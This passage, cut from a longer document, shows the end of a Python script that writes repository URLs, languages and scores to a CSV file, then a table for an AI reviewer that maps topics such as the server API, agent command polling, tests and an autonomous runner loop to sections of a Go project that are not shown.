    with open(out, 'w', newline='', encoding='utf-8') as fh:
        w = csv.writer(fh)
        w.writerow(['repo.url', 'repo.language', 'default_score'])
        for s, url, lang in filtered:
            w.writerow([url, lang, s])
    print(f"Wrote {len(filtered)} rows to {out}")

if __name__ == '__main__':
    main()
```

---

## Summary for the AI reviewer

| What to focus on                          | Where to look                                   |
|-------------------------------------------|-------------------------------------------------|
| Wire protocol between server and agent    | §6 `pkg/protocol/protocol.go`                  |
| Server HTTP API and concurrency model     | §7 `internal/server/server.go`                 |
| Agent polling and command execution logic | §9 `internal/agent/agent.go`                   |
| Current test coverage                     | §8, §10 (`*_test.go` files)                    |
| Next features to implement                | §13 `FEATURE.md`                               |
| Rules the AI agent must follow            | §13 `AGENT.md`                                 |
| Autonomous loop / daemon mechanics        | §13 `runner.py`                                |
| What has already been built               | §13 `change.log`                               |
| Go module / no external deps              | §3 `go.mod`                                    |
